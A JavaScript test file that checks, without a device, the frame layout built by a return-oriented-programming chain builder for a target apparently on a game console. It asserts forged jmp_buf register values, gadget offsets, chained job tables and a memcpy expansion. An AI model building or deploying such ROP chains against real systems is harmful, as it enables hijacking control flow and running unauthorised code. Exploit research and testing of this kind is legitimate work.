// Offline check of the Seedsow V/B/S ROP frame layout (no console access).
const assert = require('node:assert');
const chain = require('./seed-rop-chain.cjs');

const base = 0x1000000000, sdk = 0x2000000000, main = 0x3000000000;
const V = 0x00, B = 0x50, S = 0x70;
const calls = [
  {function: sdk + 0x137240, args: []},
  {function: sdk + 0x168b54, args: [1000, 0, 0, 0]},
  {function: sdk + 0x586fb0, args: [base + 0x100, base + 0x200, {u32: base + 0x300}, 0]},
];
const {frame, proof} = chain.build(base, 0x40000, calls, sdk, main);
const read = address => frame.readBigUInt64LE(address - base);

// Forged jmp_buf: x19 = first job, PC = vcall8_restore, SP = chain base.
const j0 = Number(read(base + 0x00));
assert.equal(j0 % 8, 0, 'job pointer');
assert.equal(read(base + 0x50), 0, 'x29');
assert.equal(read(base + 0x58), sdk + 0x3d9e54, 'jmp_buf pc');
assert.equal(read(base + 0x68), base + 0x8000, 'jmp_buf sp');

assert.equal(proof.nativeCalls, 4, 'memcpy expansion');
assert.deepEqual(proof.logicalResultIndices, [0, 1, 3]);

const at = index => base + 0x8000 + index * 0x90;
const jt = index => j0 + index * 0x60;
for (let index = 0; index < proof.nativeCalls; index++) {
  assert.equal(read(at(index) + V + 0x48), main + 0xc27d8, 'g_call2 ' + index);
  assert.equal(read(at(index) + B + 0x08), main + 0x173db4, 'g_store ' + index);
  assert.equal(read(at(index) + B + 0x18), base + proof.resultOffsets[index], 'result ' + index);
  const last = index + 1 === proof.nativeCalls;
  assert.equal(read(at(index) + S + 0x08), last ? sdk + 0x142410 : sdk + 0x3d9e54, 'next pc ' + index);
  assert.equal(read(at(index) + S + 0x18), last ? 0 : jt(index + 1), 'next job ' + index);
}
assert.equal(read(jt(0) + 0x48), sdk + 0x137240, 'tick target');
assert.equal(read(jt(1) + 0x48), sdk + 0x168b54, 'sleep target');
assert.equal(read(jt(2) + 0x48), sdk + 0x5224e0, 'memcpy target');
assert.equal(read(jt(3) + 0x48), sdk + 0x586fb0, 'third call target');
// The dynamic memcpy writes into the third call's V+0x10 (arg 2).
assert.equal(read(jt(2) + 0x50), base + 0x8000 + 3 * 0x90 + V + 0x10, 'memcpy dest');
assert.equal(read(jt(2) + 0x38), base + 0x300, 'memcpy src');
assert.equal(read(at(3) + V + 0x10), 0, 'dynamic placeholder');
// Result cells are contiguous and prefilled, and sit below the job table.
for (let index = 0; index < proof.nativeCalls + 2; index++)
  assert.equal(read(base + proof.resultOffsets[0] + index * 8), chain.SENTINEL, 'sentinel ' + index);
assert.equal(proof.cancelCell, jt(1) + 0x48, 'cancel cell');
console.log('LAYOUT OK', JSON.stringify(proof));
